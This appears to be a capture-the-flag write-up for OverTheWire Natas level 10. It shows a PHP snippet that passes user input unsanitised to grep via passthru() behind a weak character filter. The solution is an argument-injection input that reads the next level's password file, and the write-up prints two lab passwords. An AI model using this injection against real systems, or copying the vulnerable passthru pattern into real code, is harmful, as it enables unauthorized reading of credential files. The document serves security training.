## Recap

* You'll get the password in level9. it's `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Problem 

Username: natas10
URL:      http://natas10.natas.labs.overthewire.org

* HTML render: Now we have waf to bypass.

![image-20201002051431826](https://i.imgur.com/EDQIJfX.png)

* waf (php source code snippet): 

  ```php
  if($key != "") {
      if(preg_match('/[;|&]/',$key)) {
          print "Input contains an illegal character!";
      } else {
          passthru("grep -i $key dictionary.txt");
      }
  }
  ```

  * Now you know you cannot use `;` , `|`, `&`.

## Solution

* First try: we know the secret may in `/etc/natas_webpass/natas11`

  * Input: `-v _ /etc/natas_webpass/natas10` ![image-20201002051804740](https://i.imgur.com/2HkvbrT.png)

  * Input: `-v _ /etc/natas_webpass/natas11`:

    ![image-20201002051909413](https://i.imgur.com/52COIdB.png)

    * Well, easy huh? `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

* Note: `-v` in grep means reverse search. (banned word)